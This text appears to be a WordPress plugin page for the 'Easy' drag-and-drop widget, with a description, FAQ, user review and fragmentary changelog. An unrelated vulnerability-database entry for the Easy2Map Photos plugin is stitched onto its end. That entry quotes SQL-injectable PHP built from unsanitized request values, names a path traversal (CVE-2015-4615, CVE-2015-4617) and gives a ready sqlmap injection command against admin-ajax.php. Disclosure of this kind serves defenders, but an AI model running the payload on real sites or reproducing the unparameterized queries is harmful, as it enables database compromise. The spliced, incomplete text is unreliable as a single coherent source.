## Description

Easy is a multi-functional widget covering most of the native WordPress functions commonly used in templates.

You can place almost any part of your content anywhere in your sidebars.

The widget is made out of drag&drop bits (bricks) and is totally up to you what you want to show on your website.

Showcase:

Easy widget has variety of bricks representing the content and its logic. You can make simple or complex layout simply by dragging the bricks in to their slots and define on what cases it has to be shown or not.

Content bricks are:

* title
* content
* featured image
* categories
* tags
* taxonomies
* custom meta
* comments
* author
* date
* shortcode
* post gallery
* sidebar
* WPpagenavi (when installed)
* …
* and even your own content bricks if you like

The resulting content is displayed based on the logic you build the same way as you did the content.

You just drag the logical bricks to their slot and the content will be shown based on that logic.

Logical bricks are:

* Number of posts
* post type chooser
* offset
* hierarchical logic (for pages and alike)
* category filter
* custom meta filter
* post status
* edit link
* permissions
* meta filter
* taxonomy filter
* …
* and even your own logic bricks if you like

In adition to that the result can be designed to your needs. You can add your own classes to the whole widget (the HTML structure) and also to each content brick (a part of the content).

Then again it is totally up to you how you design your website.

Does it reminds you something?

Yes, it is exactly what you do when you design your template; you loop through the post or pages in your template, but this time without touching the code.

All the content and logical bricks are only graphical representation of the WordPress functions.

The aim of this plugin is to speed up common programming work, so we do not have to repeat our selves.

Imagine a website made out of “sidebars” filled with widgets representing the list of last posts, menu, the image gallery, any content that is actually the website.

All built out of widgets that you can re-arrange anyway you or your client like right out of the admin area. That is the main purpose of the widgets anyway, Easy makes it real.

#### Notice

In order to have the website fast as light even with the Easy plugin heavily in charge use the W3TC caching plugin [[1](https://wordpress.org/extend/plugins/w3-total-cache/)]

## Installation

As usual. If you don’t know how, check out the [official how-to](https://codex.wordpress.org/Managing_Plugins).

## FAQ

Why I cannot use more then one instance of some control bricks?

Yep, you cannot. You can do it only for some control bricks where it “makes sense”.

Why did you make such a thing for free?

This is my reward to the WP community

What if I want my to make my own function part of the Easy widget?

It is possible and even more, it’s easy. Check out the documentation [Extend](http://2046.cz/easy/extend).

Plenty of options. Easy to use. Highly recommended to anyone who needs to create a custom configurable widget without the hassle of touching any PHP code. May need to add a dash of CSS to style your creation though.
One recommendation: Add a way to override HTML tags. For example, I prefer to use < article > instead of div and < li > for some items. A text field for the preferred HTML tag above the CSS text field would work well.
Thank you!

* FIX – show-hide on ID – there was a bug when multipple IDs where defined.

#### 0.9

#### 0.8.9

* FIX – CONTROL – Show-Hide on ID
* NEW – CONTROL – Meta – a custom meta filter

* The security time comes.

  All the input fields are now automatically escaped during the widget saving process. All the escapes techniques are defined for each field separately.

  If you define your own item (meaning, if you extend the Easy of by your own bricks), doesn’t matter if View or Control you can choose from any WordPress built in sanitize, escape function as well as native PHP functions and functions that comes with this plug-in (more in the Documentation).

#### 0.7.4

* You can exclude the featured image from the gallery in “Post gallery” brick. Warning! All “Post gallery” bricks has to be updated!

#### 0.7.3

* FIX -small javascript fix needed for upcoming WP 3.5.

#### 0.7.2

* NEW – select box in “Post gallery” that lets you select where from the image title will be taken or if any. choices: empty title attribute, image as image title attribute, caption as image title attribute. The title is used in the img HTML tag.. and is used by most lightboxes.
* FIX – VIEW – Taxonomies (Categories) – the class has not been considered when the number check box has not been checked
* FIX – CONTROL – “For actual post/page” – the brick worked only for posts. From now on it guesses the actual post/page/… type and so you can make gallery for any post type automatically
* FIX – CONTROL – sorting – this functin doesn’t sorted att all, now it does.. can’t believe nobody complained so far.

#### 0.7.1

* to be more precise I have renamed the “Image” brick to “Featured image” (no function change)
* NEW – VIEW brick – “Post gallery” – you can now take all the post images for the post/pages defined in the control logic and build a image gallery.
* NEW – CONTROL – “For actuallly viewed “post/page” – it will “guess” the actually visible post/page ID and shows the elements defined in the CONTENT slot.

  This is usefull especially together with the “Post gallery” VIEW brick. When you use them together it creates a gallery out of all images uploaded in that particular post/page automatically.

#### 0.7

* NEW – VIEW brick: internal type which is rendered after the view content.. (interesting only for developers)
* NEW – VIEW brick: WP-Page navigation brick (Works when the [WP-Pagenavi](https://wordpress.org/extend/plugins/wp-pagenavi/) plugin is active
* NEW – VIEW brick – prev link
* CHANGE – Couple changes in inner function names and structure (it should not affect your actual setup)
* CHANGE – the function “f2046\_front\_end\_builder” that actualy renders the loop content is given the whole query object instead the post->ID. Which means you can get more data to play with.. if you are developer

#### 0.6.5

* FIX – I’ve been mixing an instance calls with static calls .) , which triggers errors on some server setups

#### 0.6.4

* NEW – CONTROL – show pages based on hierarchy level (like: child pages of the parent page by ID, child pages of current page etc.)
* FIX – resorting the settings aray was not a good idea – removed and so the CONTROL taxonomy has been rewriten a bit

#### 0.6.3

* FIX – no “big” changes for today. I have fixed the UI CSS. The widget looks good .) on all major browsers. Chrome (v.21), Firefox (v.15+) and also the Explorer (v 8+)

#### 0.6.2

* NEW – VIEW brick – link to archive (taxonomy, post\_type (if is allowed))
* FIX – jQuery droppable did not accept larger bricks.
* FIX – I did not realized how ugly it looks under the Firefox ;/ It’s bit polished now 🙂 {Chrome is perfect.. Don’t know about the ancient pseudo browser Explorer though.. will check it later.}

#### 0.6.1

* NEW – Controler: show post/page based on ID or IDS only
* NEW – Controler: Debug a flexible debug feature (Though it is in the control slot, it doesn’t change anything it just outputs the debug.).
* FIX – The post type has been broken, it doesn’t reflect the user “post type” value, sorry for that.

#### 0.6

* NEW – “Classic” widget title
* NEW – Date view bricks
* NEW – Status controller
* NEW – category view bricks changed to multi-functional taxonomy brick (category as default)
* NEW – Controller restrictor – restrictor is a pseudo-controller. Unlike the controller which controls the wp\_query the resistor runs before the query and let it be executed or not… in cases such as show or not on homepage etc. (Restrictors are type of controller, and so are naturally part of the Controls )
* NEW – Controller restrictor: show on (conditionals), show – hide on template types,
* NEW – Controller restrictor: Show/hide on ID (linear, and Hierarchical),
* NEW – Controller restrictor: show hide on taxonomies,
* NEW – Controller restrictor: on/off pagination,
* NEW – Controller restrictor: Taxonomy controler
* NEW – content brick has 2 more options.. show the content “above the more tag”, and content “below the more tag”
* CHANGE – the post types are not automatically populated, a simple input is used instead
* .. plus code fixes

#### 0.5.2

* Controls some control bricks are repeatable – If they can or cannot is defined in the item array

| **Description:** Easy2Map Photos is a simple-yet-powerful tool for generating great-looking geo-tagged photo galleries. |
| **Vulnerability:**The following lines in Functions.php are vulnerable to SQL injection attack because they are not parameterized or sanitizing user input. 48 $wpdb->query(sprintf("UPDATE $mapsTable 49 SET PolyLines = '%s' 50 WHERE ID = '%s';", $PolyLines, $mapID)); 218 $wpdb->query(sprintf(" 219 UPDATE $mapsTable 220 SET TemplateID = '%s', 221 MapName = '%s', 222 Settings = '%s', 223 CSSValues = '%s', 224 CSSValuesPhoto = '%s', 225 CSSValuesMap = '%s', 226 MapHTML = '%s', 227 IsActive = 1 228 WHERE ID = %s;", 229 $\_REQUEST['mapTemplateName'], 230 $\_REQUEST['mapName'], 231 urldecode($\_REQUEST['mapSettingsXML']), 232 urldecode($\_REQUEST["parentCSSXML"]), 233 urldecode($\_REQUEST["photoCSSXML"]), 234 urldecode($\_REQUEST["mapCSSXML"]), 235 urldecode($\_REQUEST["mapHTML"]), $mapID)); 238 //this is a map insert 239 if (!$wpdb->query(sprintf(" 240 INSERT INTO $mapsTable( 241 TemplateID, 242 MapName, 243 DefaultPinImage, 244 Settings, 245 LastInvoked, 246 PolyLines, 247 CSSValues, 248 CSSValuesPhoto, 249 CSSValuesMap, 250 MapHTML, 251 IsActive 252 ) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s' , 0);", 253 $\_REQUEST['mapTemplateName'], 254 $\_REQUEST['mapName’] 331 $wpdb->query(sprintf(" 332 UPDATE $mapsTable 333 SET MapName = '%s' 334 IsActive = 1 335 WHERE ID = %s;", 336 $\_REQUEST['mapName'], 337 $mapID)); , Also In MapPinImageUpload.php and MapPinIconSave.php this code would allow someone to create files outside of the intended upload directory by adding ../../../../ path traversal characters: if (!file\_exists($imagesDirectory)) { mkdir($imagesDirectory); } CVE-2015-4615 SQL Injection CVE-2015-4617 Path traversal |
| **Export:** [JSON](export_json.py?id=) [TEXT](txt/.txt) [XML](xml.php?s=) |
| **Exploit Code:** ```   1. $ sqlmap -u 'http://wp.site:80/wp-admin/admin-ajax.php' --data="mapID=11&mapName='+or+1%3D%3D1%3B&action=e2m_img_save_map_name" --cookie='COOKIE HERE' --level=5 --risk=3  ``` |
